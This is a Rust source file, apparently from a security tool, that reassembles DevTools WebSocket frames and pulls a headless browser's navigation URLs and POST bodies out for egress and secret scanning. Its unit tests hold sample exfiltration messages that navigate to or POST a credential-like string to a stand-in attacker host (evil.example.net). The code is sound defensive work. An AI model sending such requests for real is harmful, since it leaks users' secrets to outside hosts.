// SPDX-License-Identifier: MPL-2.0
// Copyright (c) grith contributors

//! In-line CDP (Chrome DevTools Protocol) inspection — the pure parsing core
//! for work-doc item **B1**.
//!
//! A browser driven by puppeteer/playwright/chromedriver speaks CDP as plaintext
//! JSON over a WebSocket on a loopback devtools socket — *before* TLS. That is
//! the one channel where a headless browser's egress **intent** (the URL the
//! agent navigates to, the body it POSTs) is visible in the clear, so it can be
//! scored by the existing egress-policy shape/destination/method logic (W1–W4,
//! C2) rather than trusting the browser's process origin (the retracted
//! subtree-trust idea).
//!
//! This module is the IO-free, syscall-free core: reassemble WebSocket text
//! frames observed on the devtools socket and extract egress intents from the
//! CDP messages. The syscall-level observation that feeds it bytes (fd-gated
//! read/write on the tracked devtools socket) and the proxy wiring are separate,
//! later phases — see the B1 scope in
//! `work/egress-url-content-scoring-and-browser-noise-2026-08-06.md`.
//!
//! **Assumptions / limits.** The deframer expects byte-aligned input from the
//! start of the WebSocket stream (attach at socket creation, not mid-stream —
//! WebSocket has no frame delimiter to resync on). `permessage-deflate`
//! compression is not supported (chrome's devtools transport does not negotiate
//! it by default); a compressed frame simply yields no intent, never a panic.

use grith_proxy::types::ToolCallType;
use serde_json::Value;

/// Largest single WebSocket frame payload we will buffer (16 MiB). A frame
/// header claiming more is treated as stream desync — the deframer resets rather
/// than allocate unboundedly. Real CDP text messages (even base64 screenshots)
/// sit well under this; oversized/garbage frames are dropped, not scored.
const MAX_FRAME_PAYLOAD: usize = 16 * 1024 * 1024;

/// Cap on a URL / body string surfaced as intent — avoids copying a huge
/// `data:` URL or base64 body wholesale into a scoring context.
const MAX_INTENT_FIELD: usize = 8192;

/// A recovered egress intent from a CDP message: the URL the agent is driving
/// the browser to, plus (for network requests) the HTTP method and body.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CdpEgressIntent {
    pub url: String,
    pub method: Option<String>,
    pub body: Option<String>,
    /// The CDP method that produced this intent (for forensics/telemetry).
    pub source: &'static str,
}

impl CdpEgressIntent {
    /// Convert a recovered intent into a proxy tool-call + its arguments JSON, so
    /// the existing egress-policy / secret-scan / dlp-gate pipeline (W1–W4, C1,
    /// C2) scores the URL, method and body the agent handed the browser. `GET` is
    /// assumed when the CDP message carried no method (a bare navigation). The
    /// caller wraps this in a `ToolCallContext` with the session id (Phase 3
    /// wiring). The body rides in `arguments` — exactly the C1 surface both
    /// secret-scan and dlp-gate already scan.
    pub fn to_tool_call(&self) -> (ToolCallType, Value) {
        let method = self.method.clone().unwrap_or_else(|| "GET".to_string());
        let mut args = serde_json::json!({ "method": method, "url": self.url });
        if let Some(body) = &self.body {
            args["body"] = Value::String(body.clone());
        }
        (
            ToolCallType::HttpRequest {
                method,
                url: self.url.clone(),
            },
            args,
        )
    }
}

/// Where a browser spawn was told to expose the DevTools protocol (B1 Phase 0).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RemoteDebugEndpoint {
    /// `--remote-debugging-port=<port>` — loopback TCP (port 0 = kernel-assigned).
    Port(u16),
    /// `--remote-debugging-pipe` — fd 3/4 pipes, no TCP socket.
    Pipe,
}

/// B1 Phase 0: detect whether a spawn opens a CDP control channel, and where.
/// The `--remote-debugging-*` flags are browser-specific, so their presence is
/// itself the signal that a CDP-controllable browser is live for this session.
pub fn parse_remote_debugging_endpoint(args: &[String]) -> Option<RemoteDebugEndpoint> {
    let mut endpoint = None;
    for arg in args {
        if arg == "--remote-debugging-pipe" {
            // A pipe transport takes precedence and is unambiguous.
            return Some(RemoteDebugEndpoint::Pipe);
        }
        if let Some(value) = arg.strip_prefix("--remote-debugging-port=") {
            if let Ok(port) = value.trim().parse::<u16>() {
                endpoint = Some(RemoteDebugEndpoint::Port(port));
            }
        }
    }
    endpoint
}

/// Extract browser egress intents from one CDP JSON message. Covers the methods
/// that carry a navigation target or an outbound request: `Page.navigate`
/// (driver command), `Network.requestWillBeSent` and `Fetch.requestPaused`
/// (events/interception carrying the request URL + optional body). Anything else
/// (command responses, DOM/console events) yields nothing.
pub fn extract_egress_intents(message: &str) -> Vec<CdpEgressIntent> {
    let Ok(value) = serde_json::from_str::<Value>(message) else {
        return Vec::new();
    };
    let Some(method) = value.get("method").and_then(Value::as_str) else {
        return Vec::new();
    };
    let params = value.get("params");
    let mut out = Vec::new();
    match method {
        "Page.navigate" => {
            if let Some(url) = params.and_then(|p| p.get("url")).and_then(Value::as_str) {
                out.push(CdpEgressIntent {
                    url: clamp(url),
                    method: None,
                    body: None,
                    source: "Page.navigate",
                });
            }
        }
        "Network.requestWillBeSent" | "Fetch.requestPaused" => {
            let request = params.and_then(|p| p.get("request"));
            if let Some(url) = request.and_then(|r| r.get("url")).and_then(Value::as_str) {
                let http_method = request
                    .and_then(|r| r.get("method"))
                    .and_then(Value::as_str)
                    .map(str::to_string);
                let body = request
                    .and_then(|r| r.get("postData"))
                    .and_then(Value::as_str)
                    .map(clamp);
                out.push(CdpEgressIntent {
                    url: clamp(url),
                    method: http_method,
                    body,
                    source: if method == "Fetch.requestPaused" {
                        "Fetch.requestPaused"
                    } else {
                        "Network.requestWillBeSent"
                    },
                });
            }
        }
        _ => {}
    }
    out
}

/// Truncate a field to `MAX_INTENT_FIELD` on a UTF-8 char boundary.
fn clamp(s: &str) -> String {
    if s.len() <= MAX_INTENT_FIELD {
        return s.to_string();
    }
    let mut end = MAX_INTENT_FIELD;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    s[..end].to_string()
}

/// Result of attempting to parse one frame off the front of the buffer.
enum FrameParse {
    /// Not enough bytes buffered yet for a complete frame.
    Incomplete,
    /// A frame header is nonsensical (oversized) — reset and give up on the
    /// current stream (WebSocket cannot resync mid-stream).
    Desync,
    /// A complete text message was reassembled.
    Message(String),
    /// A frame was consumed but produced no message (control frame, fragment
    /// start, binary, or non-UTF-8 text).
    Skipped,
}

/// Stateful WebSocket text-frame reassembler for one direction of one socket.
/// Fed raw observed bytes; yields complete UTF-8 text messages (the CDP JSON).
/// Handles masked (client→server commands) and unmasked (server→client events)
/// frames, 7/16/64-bit lengths, and fragmentation; skips binary/control frames.
#[derive(Default)]
pub struct WsDeframer {
    /// Unparsed bytes at the head of the stream.
    buf: Vec<u8>,
    /// Accumulated payload of a fragmented text message in progress.
    fragment: Vec<u8>,
    in_text_fragment: bool,
}

impl WsDeframer {
    pub fn new() -> Self {
        Self::default()
    }

    /// Push observed bytes; return any newly-completed text messages (in order).
    pub fn push(&mut self, bytes: &[u8]) -> Vec<String> {
        self.buf.extend_from_slice(bytes);
        let mut messages = Vec::new();
        loop {
            match self.try_parse_frame() {
                FrameParse::Incomplete => break,
                FrameParse::Desync => {
                    self.reset();
                    break;
                }
                FrameParse::Message(m) => messages.push(m),
                FrameParse::Skipped => {}
            }
        }
        messages
    }

    fn reset(&mut self) {
        self.buf.clear();
        self.fragment.clear();
        self.in_text_fragment = false;
    }

    fn try_parse_frame(&mut self) -> FrameParse {
        if self.buf.len() < 2 {
            return FrameParse::Incomplete;
        }
        let b0 = self.buf[0];
        let b1 = self.buf[1];
        let fin = b0 & 0x80 != 0;
        let opcode = b0 & 0x0F;
        let masked = b1 & 0x80 != 0;
        let len7 = (b1 & 0x7F) as usize;

        let (payload_len, len_field) = match len7 {
            126 => {
                if self.buf.len() < 4 {
                    return FrameParse::Incomplete;
                }
                (
                    u16::from_be_bytes([self.buf[2], self.buf[3]]) as usize,
                    2usize,
                )
            }
            127 => {
                if self.buf.len() < 10 {
                    return FrameParse::Incomplete;
                }
                let mut b = [0u8; 8];
                b.copy_from_slice(&self.buf[2..10]);
                (u64::from_be_bytes(b) as usize, 8usize)
            }
            n => (n, 0usize),
        };

        if payload_len > MAX_FRAME_PAYLOAD {
            return FrameParse::Desync;
        }
        let mask_len = if masked { 4 } else { 0 };
        let header_len = 2 + len_field + mask_len;
        let total = header_len + payload_len;
        if self.buf.len() < total {
            return FrameParse::Incomplete;
        }

        let mut payload = self.buf[header_len..total].to_vec();
        if masked {
            let key_off = 2 + len_field;
            let key = [
                self.buf[key_off],
                self.buf[key_off + 1],
                self.buf[key_off + 2],
                self.buf[key_off + 3],
            ];
            for (i, byte) in payload.iter_mut().enumerate() {
                *byte ^= key[i % 4];
            }
        }
        self.buf.drain(..total);

        match opcode {
            0x1 => {
                // Text frame.
                if fin {
                    self.in_text_fragment = false;
                    string_message(payload)
                } else {
                    self.fragment = payload;
                    self.in_text_fragment = true;
                    FrameParse::Skipped
                }
            }
            0x0 => {
                // Continuation frame.
                if !self.in_text_fragment {
                    return FrameParse::Skipped; // stray continuation — ignore
                }
                if self.fragment.len() + payload.len() > MAX_FRAME_PAYLOAD {
                    self.reset();
                    return FrameParse::Skipped;
                }
                self.fragment.extend_from_slice(&payload);
                if fin {
                    self.in_text_fragment = false;
                    let msg = std::mem::take(&mut self.fragment);
                    string_message(msg)
                } else {
                    FrameParse::Skipped
                }
            }
            // Binary (CDP is text) and control frames (close/ping/pong): ignore.
            _ => FrameParse::Skipped,
        }
    }
}

fn string_message(bytes: Vec<u8>) -> FrameParse {
    match String::from_utf8(bytes) {
        Ok(s) => FrameParse::Message(s),
        Err(_) => FrameParse::Skipped,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---- Phase 0: remote-debugging endpoint detection ----

    #[test]
    fn detects_remote_debugging_port() {
        let args = vec![
            "--headless".to_string(),
            "--remote-debugging-port=9222".to_string(),
        ];
        assert_eq!(
            parse_remote_debugging_endpoint(&args),
            Some(RemoteDebugEndpoint::Port(9222))
        );
    }

    #[test]
    fn detects_kernel_assigned_port_zero() {
        let args = vec!["--remote-debugging-port=0".to_string()];
        assert_eq!(
            parse_remote_debugging_endpoint(&args),
            Some(RemoteDebugEndpoint::Port(0))
        );
    }

    #[test]
    fn detects_pipe_transport() {
        let args = vec!["--remote-debugging-pipe".to_string()];
        assert_eq!(
            parse_remote_debugging_endpoint(&args),
            Some(RemoteDebugEndpoint::Pipe)
        );
    }

    #[test]
    fn no_debug_endpoint_for_plain_launch() {
        let args = vec!["--headless".to_string(), "https://example.com".to_string()];
        assert_eq!(parse_remote_debugging_endpoint(&args), None);
    }

    // ---- CDP intent extraction ----

    #[test]
    fn extracts_page_navigate_url() {
        let msg = r#"{"id":1,"method":"Page.navigate","params":{"url":"https://evil.example.net/x?d=blob"}}"#;
        let intents = extract_egress_intents(msg);
        assert_eq!(intents.len(), 1);
        assert_eq!(intents[0].url, "https://evil.example.net/x?d=blob");
        assert_eq!(intents[0].source, "Page.navigate");
        assert!(intents[0].body.is_none());
    }

    #[test]
    fn extracts_network_request_with_post_body() {
        let msg = r#"{"method":"Network.requestWillBeSent","params":{"requestId":"1","request":{"url":"https://evil.example.net/upload","method":"POST","postData":"secret=AKIAQYLPMN5HZ3RT2WX4"}}}"#;
        let intents = extract_egress_intents(msg);
        assert_eq!(intents.len(), 1);
        assert_eq!(intents[0].url, "https://evil.example.net/upload");
        assert_eq!(intents[0].method.as_deref(), Some("POST"));
        assert_eq!(
            intents[0].body.as_deref(),
            Some("secret=AKIAQYLPMN5HZ3RT2WX4")
        );
        assert_eq!(intents[0].source, "Network.requestWillBeSent");
    }

    #[test]
    fn intent_converts_to_scannable_http_tool_call() {
        let intent = CdpEgressIntent {
            url: "https://evil.example.net/upload".into(),
            method: Some("POST".into()),
            body: Some("secret=AKIAQYLPMN5HZ3RT2WX4".into()),
            source: "Network.requestWillBeSent",
        };
        let (call, args) = intent.to_tool_call();
        match call {
            ToolCallType::HttpRequest { method, url } => {
                assert_eq!(method, "POST");
                assert_eq!(url, "https://evil.example.net/upload");
            }
            other => panic!("expected HttpRequest, got {other:?}"),
        }
        // Body rides in arguments — the C1 surface secret-scan/dlp-gate scan.
        assert_eq!(
            args.get("body").and_then(Value::as_str),
            Some("secret=AKIAQYLPMN5HZ3RT2WX4")
        );
    }

    #[test]
    fn navigation_without_method_defaults_to_get() {
        let intent = CdpEgressIntent {
            url: "https://x/y".into(),
            method: None,
            body: None,
            source: "Page.navigate",
        };
        let (call, args) = intent.to_tool_call();
        assert!(matches!(call, ToolCallType::HttpRequest { method, .. } if method == "GET"));
        assert!(args.get("body").is_none());
    }

    #[test]
    fn ignores_command_response_and_unrelated_events() {
        // A response to a command (no "method").
        assert!(extract_egress_intents(r#"{"id":1,"result":{"frameId":"x"}}"#).is_empty());
        // An unrelated event.
        assert!(
            extract_egress_intents(r#"{"method":"Runtime.consoleAPICalled","params":{}}"#)
                .is_empty()
        );
        // Not JSON.
        assert!(extract_egress_intents("not json at all").is_empty());
    }

    // ---- WebSocket deframing ----

    fn frame(opcode: u8, payload: &[u8], fin: bool, mask: Option<[u8; 4]>) -> Vec<u8> {
        let mut f = Vec::new();
        f.push(if fin { 0x80 } else { 0 } | opcode);
        let mask_bit = if mask.is_some() { 0x80 } else { 0 };
        let len = payload.len();
        if len <= 125 {
            f.push(mask_bit | len as u8);
        } else if len <= 0xFFFF {
            f.push(mask_bit | 0x7E);
            f.extend_from_slice(&(len as u16).to_be_bytes());
        } else {
            f.push(mask_bit | 0x7F);
            f.extend_from_slice(&(len as u64).to_be_bytes());
        }
        if let Some(key) = mask {
            f.extend_from_slice(&key);
            let mut p = payload.to_vec();
            for (i, b) in p.iter_mut().enumerate() {
                *b ^= key[i % 4];
            }
            f.extend_from_slice(&p);
        } else {
            f.extend_from_slice(payload);
        }
        f
    }

    fn text(s: &str, masked: bool) -> Vec<u8> {
        frame(
            0x1,
            s.as_bytes(),
            true,
            masked.then_some([0x12, 0x34, 0x56, 0x78]),
        )
    }

    #[test]
    fn deframes_single_unmasked_text_frame() {
        let mut d = WsDeframer::new();
        let json = r#"{"method":"Page.navigate","params":{"url":"https://x/y"}}"#;
        let msgs = d.push(&text(json, false));
        assert_eq!(msgs, vec![json.to_string()]);
        assert_eq!(extract_egress_intents(&msgs[0])[0].url, "https://x/y");
    }

    #[test]
    fn deframes_masked_client_command() {
        // Driver→browser commands are masked; the deframer must unmask.
        let mut d = WsDeframer::new();
        let json = r#"{"id":5,"method":"Page.navigate","params":{"url":"https://a/b"}}"#;
        let msgs = d.push(&text(json, true));
        assert_eq!(msgs, vec![json.to_string()]);
    }

    #[test]
    fn reassembles_fragmented_message() {
        let mut d = WsDeframer::new();
        let part1 = r#"{"method":"Network.requestWillBeSent","params":{"request":{"url":"#;
        let part2 = r#""https://z/w","method":"GET"}}}"#;
        // text frame (fin=0) + continuation frame (fin=1).
        let mut bytes = frame(0x1, part1.as_bytes(), false, None);
        bytes.extend_from_slice(&frame(0x0, part2.as_bytes(), true, None));
        let msgs = d.push(&bytes);
        assert_eq!(msgs.len(), 1);
        assert_eq!(extract_egress_intents(&msgs[0])[0].url, "https://z/w");
    }

    #[test]
    fn completes_frame_split_across_pushes() {
        let mut d = WsDeframer::new();
        let json = r#"{"method":"Page.navigate","params":{"url":"https://split/1"}}"#;
        let full = text(json, false);
        let (a, b) = full.split_at(5);
        assert!(d.push(a).is_empty()); // partial header/body — nothing yet
        let msgs = d.push(b);
        assert_eq!(msgs, vec![json.to_string()]);
    }

    #[test]
    fn skips_control_frames_between_text() {
        let mut d = WsDeframer::new();
        let ping = frame(0x9, b"hb", true, None); // control frame
        let json = r#"{"method":"Page.navigate","params":{"url":"https://ok/1"}}"#;
        let mut bytes = ping;
        bytes.extend_from_slice(&text(json, false));
        let msgs = d.push(&bytes);
        assert_eq!(msgs, vec![json.to_string()]);
    }

    #[test]
    fn oversized_frame_resets_without_panic() {
        let mut d = WsDeframer::new();
        // A 64-bit length header claiming ~4 GiB, no payload delivered.
        let mut bytes = vec![0x81, 127];
        bytes.extend_from_slice(&(0xFFFF_FFFFu64).to_be_bytes());
        let msgs = d.push(&bytes);
        assert!(msgs.is_empty());
        // Deframer recovered (buffer cleared); a fresh valid frame still parses.
        let json = r#"{"method":"Page.navigate","params":{"url":"https://after/reset"}}"#;
        assert_eq!(d.push(&text(json, false)), vec![json.to_string()]);
    }
}
